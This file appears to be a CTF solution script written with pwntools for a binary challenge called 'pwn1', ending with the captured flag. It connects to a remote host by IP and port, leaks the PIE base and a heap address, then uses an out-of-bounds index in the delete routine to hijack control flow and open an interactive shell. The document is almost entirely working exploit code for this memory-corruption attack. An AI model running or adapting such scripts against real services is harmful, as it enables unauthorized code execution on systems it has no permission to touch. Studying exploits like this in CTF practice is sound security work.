# out of boundary
from pwn import *

#s = process('./pwn1')
s = remote('51.15.73.163',8088)

def new(content):
    s.sendlineafter('> ','1')
    s.sendafter('> ',content)

def dele(idx):
    s.sendlineafter('> ','2')
    s.sendlineafter('> ',idx)

def hel():
    s.sendlineafter('> ','3')

pause()

# PIE LEAK
hel()
s.recvuntil('I am located at ')
pie = int(s.recvline()[2:-1],16) - 0xc1a
log.info("PIE : " + hex(pie))

# HEAP LEAK
new(''.ljust(0xf0,'A'))
s.recvuntil('Created at ')
heap = int(s.recvline()[2:-2],16)
log.info("HEAP : " + hex(heap))

# EXPLOIT
dele('0')
new((p64(heap+0x10) + p64(pie+0xa30)).ljust(0xf0,'A'))
ele = pie + 0x202040
off = (heap - ele) / 8
dele(str(off+1))
s.interactive()

# CTF{Y0U_4R3_T0_B3_R3W4RD3D}
